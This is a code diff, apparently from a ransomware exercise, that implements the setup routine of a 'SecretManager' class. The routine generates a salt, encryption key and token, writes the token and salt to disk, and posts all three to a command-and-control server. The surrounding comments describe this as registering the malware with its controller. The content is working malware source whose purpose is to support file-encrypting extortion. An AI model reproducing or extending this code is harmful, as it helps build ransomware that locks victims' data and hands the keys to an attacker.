@@ -50,11 +50,26 @@ class SecretManager:
             "token": self.bin_to_b64(token), #conversion en base64
             "salt": self.bin_to_b64(salt),   #conversion en base64
             "key": self.bin_to_b64(key)}     #conversion en base64
-        requests.post(url, json=data)   #Utilisation de la fonction post de request qui prend un url et la data à envoyer en paramètre
+        requests.post(url, json=data)   #Utilisation de la fonction post de request qui prend un url et la data à envoyer en paramètres
 
-    def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+    def setup(self) -> None:
+        token_path = os.path.join(self._path, "token.bin")
+        salt_path = os.path.join(self._path, "salt.bin")
+
+        if os.path.exists(token_path): #exists me permet de vérifier si /root/token.bin existe déjà
+            print("attention token.bin déjà existant")
+        else:
+            salt, key, token = self.create() #Utilisation de create codé auparavant
+
+            token_file = open(token_path, "wb")
+            token_file.write(token) #ecriture de token dans token_file en binaire
+            token_file.close()
+
+            salt_file = open(salt_path, "wb")
+            salt_file.write(salt) # "" 
+            salt_file.close()
+
+            self.post_new(salt, key, token) #Utilisation de post_new codé auparavant
 
     def load(self)->None:
         # function to load crypto data
